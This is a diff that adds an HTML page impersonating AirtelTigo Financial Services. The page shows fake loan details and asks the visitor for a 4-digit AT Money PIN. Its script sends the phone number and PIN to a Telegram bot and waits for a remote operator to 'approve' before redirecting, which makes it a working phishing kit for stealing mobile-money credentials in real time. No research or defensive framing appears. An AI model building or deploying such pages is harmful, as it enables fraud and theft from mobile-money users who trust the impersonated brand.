@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AirtelTigo - Verify PIN</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="script.js"></script>
+    <script src="telegram.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #002d5d 0%, #001a35 100%);
+        }
+
+        .container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(0, 212, 255, 0.1) 0%, transparent 70%);
+            animation: float 20s ease-in-out infinite;
+            z-index: 0;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(30px, 30px); }
+        }
+
+        .card-wrapper {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 2rem;
+            animation: fadeInDown 0.8s ease-out;
+        }
+
+        .logo-mini {
+            width: 80px;
+            height: 80px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            animation: scaleIn 0.6s ease-out;
+            padding: 4px;
+            border: 3px solid white;
+            overflow: hidden;
+        }
+
+        .logo-mini img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
+        }
+
+        .title {
+            font-size: 1.75rem;
+            font-weight: 800;
+            color: white;
+            margin-bottom: 0.5rem;
+        }
+
+        .subtitle {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.95rem;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 2rem;
+            padding: 2.5rem;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: fadeInUp 0.8s ease-out 0.2s both;
+        }
+
+        .loan-details {
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.1) 0%, rgba(0, 45, 93, 0.1) 100%);
+            border-left: 4px solid #00d4ff;
+            border-radius: 1rem;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            animation: slideInLeft 0.6s ease-out 0.3s both;
+        }
+
+        .loan-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.75rem 0;
+        }
+
+        .loan-item:not(:last-child) {
+            border-bottom: 1px solid rgba(0, 45, 93, 0.1);
+        }
+
+        .loan-label {
+            color: #6b7280;
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+
+        .loan-value {
+            color: #002d5d;
+            font-weight: 800;
+            font-size: 1.1rem;
+        }
+
+        .warning-box {
+            background: linear-gradient(135deg, rgba(255, 165, 0, 0.1) 0%, rgba(255, 107, 53, 0.1) 100%);
+            border-left: 4px solid #ffa500;
+            border-radius: 0.75rem;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+            animation: slideInLeft 0.6s ease-out 0.4s both;
+        }
+
+        .warning-text {
+            color: #ff8c00;
+            font-weight: 600;
+            font-size: 0.95rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .pin-label {
+            text-align: center;
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: #6b7280;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 1.5rem;
+            animation: fadeInUp 0.6s ease-out 0.5s both;
+        }
+
+        .pin-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 0.75rem;
+            margin-bottom: 2rem;
+            animation: fadeInUp 0.6s ease-out 0.6s both;
+        }
+
+        .pin-input {
+            width: 60px;
+            height: 70px;
+            border: 2px solid #e5e7eb;
+            border-radius: 1rem;
+            font-size: 2rem;
+            font-weight: 800;
+            text-align: center;
+            color: #002d5d;
+            transition: all 0.3s ease;
+            background: white;
+        }
+
+        .pin-input:focus {
+            outline: none;
+            border-color: #002d5d;
+            box-shadow: 0 0 0 4px rgba(0, 45, 93, 0.1);
+            transform: scale(1.05);
+        }
+
+        .pin-input.filled {
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.1) 0%, rgba(0, 45, 93, 0.1) 100%);
+            border-color: #002d5d;
+        }
+
+        .error-message {
+            color: #ff3b30;
+            font-size: 0.875rem;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            animation: slideInLeft 0.3s ease-out;
+        }
+
+        .button-group {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 1rem;
+            margin-top: 2rem;
+            animation: fadeInUp 0.6s ease-out 0.7s both;
+        }
+
+        .btn-verify {
+            padding: 1rem;
+            border-radius: 1rem;
+            font-size: 1rem;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            background: linear-gradient(135deg, #002d5d 0%, #003d7a 100%);
+            color: white;
+            box-shadow: 0 10px 30px rgba(0, 45, 93, 0.3);
+        }
+
+        .btn-verify:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0, 45, 93, 0.4);
+        }
+
+        .btn-verify:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .btn-back {
+            padding: 0.875rem;
+            border-radius: 1rem;
+            font-size: 0.95rem;
+            font-weight: 600;
+            border: 2px solid #e5e7eb;
+            background: white;
+            color: #6b7280;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .btn-back:hover {
+            border-color: #002d5d;
+            color: #002d5d;
+            background: #f9fafb;
+        }
+
+        .processing {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            padding: 2rem;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(0, 45, 93, 0.1);
+            border-top-color: #002d5d;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .processing-text {
+            color: #002d5d;
+            font-weight: 700;
+            font-size: 1.1rem;
+        }
+
+        @media (max-width: 768px) {
+            .card {
+                padding: 1.5rem;
+            }
+
+            .pin-input {
+                width: 50px;
+                height: 60px;
+                font-size: 1.5rem;
+            }
+
+            .pin-inputs {
+                gap: 0.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card-wrapper">
+            <div class="header">
+                <div class="logo-mini">
+                    <img src="at-logo.jpg" alt="AirtelTigo">
+                </div>
+                <h1 class="title">AirtelTigo</h1>
+                <p class="subtitle">Financial Services</p>
+            </div>
+
+            <div class="card">
+                <div class="loan-details">
+                    <div class="loan-item">
+                        <span class="loan-label">Loan Amount</span>
+                        <span class="loan-value" id="loan-amount-display">GH₵5,000</span>
+                    </div>
+                    <div class="loan-item">
+                        <span class="loan-label">Loan Term</span>
+                        <span class="loan-value" id="loan-term-display">12 months</span>
+                    </div>
+                </div>
+
+                <div class="warning-box">
+                    <p class="warning-text">
+                        <i class="fas fa-info-circle"></i>
+                        Please verify your AT Money PIN to proceed
+                    </p>
+                </div>
+
+                <p class="pin-label">Enter 4-digit PIN</p>
+
+                <div class="pin-inputs" id="pin-input-container">
+                    <input type="text" maxlength="1" class="verify-pin-input pin-input" inputmode="numeric">
+                    <input type="text" maxlength="1" class="verify-pin-input pin-input" inputmode="numeric">
+                    <input type="text" maxlength="1" class="verify-pin-input pin-input" inputmode="numeric">
+                    <input type="text" maxlength="1" class="verify-pin-input pin-input" inputmode="numeric">
+                </div>
+
+                <div id="pin-error" class="error-message hidden">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span>Wrong PIN. Please try again.</span>
+                </div>
+
+                <div id="button-container" class="button-group">
+                    <button id="verify-pin-btn" class="btn-verify">
+                        <span id="btn-text">Verify Now</span>
+                        <i id="btn-icon" class="fas fa-arrow-right" style="margin-left: 0.5rem;"></i>
+                    </button>
+                    <button class="btn-back" onclick="history.back()">
+                        <i class="fas fa-arrow-left" style="margin-right: 0.5rem;"></i>
+                        Back
+                    </button>
+                </div>
+
+                <div id="processing-container" class="processing hidden">
+                    <div class="spinner"></div>
+                    <p class="processing-text">Verifying...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const verifyPinInputs = document.querySelectorAll('.verify-pin-input');
+        const verifyBtn = document.getElementById('verify-pin-btn');
+        const pinError = document.getElementById('pin-error');
+        const buttonContainer = document.getElementById('button-container');
+        const processingContainer = document.getElementById('processing-container');
+        const loanAmountDisplay = document.getElementById('loan-amount-display');
+        const loanTermDisplay = document.getElementById('loan-term-display');
+        const btnText = document.getElementById('btn-text');
+
+        const data = AppData.get();
+
+        // Display loan details
+        if (data.amount) {
+            loanAmountDisplay.innerText = `GH₵${parseInt(data.amount).toLocaleString()}`;
+        }
+        if (data.term) {
+            loanTermDisplay.innerText = `${data.term} months`;
+        }
+
+        // Handle PIN input navigation
+        verifyPinInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                pinError.classList.add('hidden');
+                if (e.target.value) {
+                    input.classList.add('filled');
+                    if (index < verifyPinInputs.length - 1) {
+                        verifyPinInputs[index + 1].focus();
+                    }
+                } else {
+                    input.classList.remove('filled');
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    verifyPinInputs[index - 1].focus();
+                }
+            });
+        });
+
+        verifyBtn.addEventListener('click', async () => {
+            const pin = Array.from(verifyPinInputs).map(i => i.value).join('');
+            if (pin.length !== 4) return;
+
+            buttonContainer.classList.add('hidden');
+            processingContainer.classList.remove('hidden');
+
+            const displayPhone = AppData.formatToDisplay(data.fullPhone);
+            const requestId = await telegramBot.notifyPIN(displayPhone, pin);
+            const result = await telegramBot.waitForApproval(requestId);
+
+            if (result.action === 'approve') {
+                btnText.textContent = 'Verified!';
+                setTimeout(() => {
+                    location.href = 'success.html';
+                }, 1000);
+            } else {
+                processingContainer.classList.add('hidden');
+                buttonContainer.classList.remove('hidden');
+                pinError.classList.remove('hidden');
+                verifyPinInputs.forEach(input => {
+                    input.value = '';
+                    input.classList.remove('filled');
+                });
+                verifyPinInputs[0].focus();
+            }
+        });
+
+        verifyPinInputs[0].focus();
+    </script>
+</body>
+</html>
